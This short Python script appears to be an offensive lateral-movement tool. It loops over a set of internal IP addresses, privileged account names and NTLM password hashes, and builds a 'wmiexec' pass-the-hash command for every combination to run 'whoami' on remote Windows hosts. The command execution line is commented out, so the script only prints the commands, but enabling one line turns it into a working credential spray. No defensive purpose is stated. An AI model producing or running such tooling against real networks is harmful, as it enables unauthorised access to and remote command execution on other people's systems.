import os
import time
ips={
'192.168.168.1',
'192.168.168.100',
'192.168.168.101',
'192.168.168.102',
'192.168.168.103',
'192.168.168.106',
'192.168.168.107',
'192.168.168.110'
}
users={
'Administrator',
'boss',
'dbadmin',
'fileadmin',
'mack',
'mary',
'vpnadm',
'webadmin'
}
hashs={
'518b98ad4178a53695dc997aa02d455c',
'ccef208c6485269c20db2cad21734fe7',
'ddf233c64823455c20db2cad21734fe7'
}
for ip in ips:
    for user in users:
        for mima in hashs:
            # exec="net use \\" + "\\" + ip + '\ipc$ ' + mima + ' /user:god\\' +user
            exec="wmiexec -hashes :" + mima + ' ./' +user + "@" +ip+ "whoami"
            print('--->'+exec+' ---> done')
            # os.system(exec)
            time.sleep(0.1)
print('all done')